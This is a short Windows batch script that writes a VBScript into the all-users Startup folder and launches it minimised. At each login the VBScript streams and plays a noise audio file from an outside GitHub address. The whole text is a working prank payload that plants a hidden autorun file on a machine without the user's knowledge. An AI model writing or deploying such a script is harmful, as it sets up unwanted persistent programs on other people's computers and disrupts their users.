@echo off
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "https://github.com/AdrianChong513/Noise/raw/main/noise.weba"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >Runtime.vbs
start /min Runtime.vbs
pause